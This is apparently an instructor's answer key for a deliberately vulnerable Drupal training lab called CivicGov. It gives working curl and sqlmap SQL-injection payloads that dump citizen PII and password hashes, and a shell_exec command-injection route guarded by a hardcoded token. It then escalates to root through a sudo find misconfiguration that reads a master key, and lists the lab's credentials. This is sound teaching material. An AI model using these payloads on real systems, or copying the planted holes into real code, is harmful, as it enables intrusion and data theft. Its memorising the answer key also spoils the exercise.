# Solution — 10 CivicGov (medium, webapp set)

> Spoilers — instructor's answer key.

## Surface

Stock Drupal 10 on `app.civicgov.lab`, Postgres 16 on `db.civicgov.lab`. `whatweb` /
`droopescan` fingerprint Drupal; `/core/`, `/CHANGELOG.txt`-style markers and the
`X-Generator` header give it away. The interesting surface is the planted **civicgov_tools**
module, which registers two anonymous routes (`_access: 'TRUE'`):

- `GET /civicgov/lookup?id=<n>` — citizen record lookup (returns JSON).
- `GET /civicgov/diag?token=<t>&cmd=<c>` — "maintenance diagnostics".

## Intended chain

### 1. SQL injection → citizen PII (vectors A + F)

`CitizenLookupController::lookup()` builds its query by concatenation, bypassing Drupal's
placeholder API:

```php
$sql = "SELECT id, full_name, national_id, email, benefit_status FROM civicgov_citizens WHERE id = " . $id;
$connection->query($sql)->fetchAll(...);
```

`?id` is injected verbatim into a single `SELECT`, so UNION / boolean / time payloads all
work. Baseline:

```sh
curl -s 'http://127.0.0.1:8510/civicgov/lookup?id=1'
curl -s 'http://127.0.0.1:8510/civicgov/lookup?id=0%20OR%201=1'      # dumps every row
```

The `civicgov_citizens` table is the reportable **PII exposure**: full name, national id,
billing email, home address and benefit status (e.g. `m.ohalloran@mailbox.example`,
`housing-assistance`). A UNION pivot reaches Drupal's own `users_field_data` too:

```sh
curl -s 'http://127.0.0.1:8510/civicgov/lookup?id=0%20UNION%20SELECT%20uid,name,pass,mail,status%20FROM%20users_field_data'
```

`sqlmap` drives it end to end (it is a clean injection point):

```sh
sqlmap -u 'http://127.0.0.1:8510/civicgov/lookup?id=1' -p id --dbms=postgresql --dump -T civicgov_citizens
```

> Note: the citizen hashes you pull from `users_field_data.pass` are Drupal's **salted**
> phpass (`$S$…`) — not a quick crack, and deliberately *not* a loot oracle. The
> reportable data is the PII table; the `pass` column is just proof the SQLi reaches core.

### 2. RCE foothold (vector J)

`CitizenLookupController::diag()` is guarded only by a static token baked into the source
(`civicgov-maint-2024`) and then passes `?cmd` straight to `shell_exec()` as `www-data`:

```sh
curl -s 'http://127.0.0.1:8510/civicgov/diag?token=civicgov-maint-2024&cmd=id'
# uid=33(www-data) gid=33(www-data) ...
curl -s --data-urlencode 'cmd=cat /etc/passwd' \
  'http://127.0.0.1:8510/civicgov/diag?token=civicgov-maint-2024' -G
```

Drop a reverse shell from here if you want an interactive foothold.

### 3. Easy privesc → root + crown jewel (vector K)

The app container ships a NOPASSWD sudo misconfig for the web user:

```
www-data ALL=(root) NOPASSWD: /usr/bin/find
```

Classic GTFOBins escalation, run through the `diag` RCE (or an interactive shell):

```sh
sudo find . -maxdepth 0 -exec /bin/sh -c 'id; cat /root/master.key' \;
# uid=0(root) ...
# CIVICGOV-MASTER-KEY: mk_live_7f3c9a21e8b64d05a1f29c4e
```

`/root/master.key` (mode 0600, root-only) is the crown jewel — unreadable as `www-data`,
recovered only after the privesc.

## Planted loot (manifest oracles)

| id | what | where |
|----|------|-------|
| `citizen-pii` | citizen PII, e.g. `m.ohalloran@mailbox.example` | Postgres `civicgov_citizens` (via SQLi or DB) |
| `planted-sqli-module` | marker `civicgov_citizens WHERE id =` | `…/civicgov_tools/src/Controller/CitizenLookupController.php` |
| `site-up` | `CivicGov Municipal Portal` | `GET http://127.0.0.1:8510/` |

## Credentials

- Drupal admin (set by the init container): **`admin` / `Civic-Admin-2024!`** — sign in at
  `/user/login`, or escalate a stolen session.
- Postgres: `civicgov` / `civicgov-db-2024`, database `civicgov`.
- `diag` maintenance token: `civicgov-maint-2024`.

## Reset

`make lab-restore LAB=10-medium-drupal` (recreate — drops the Postgres **and** Drupal
codebase volumes; the init container re-installs and re-seeds on the next boot).
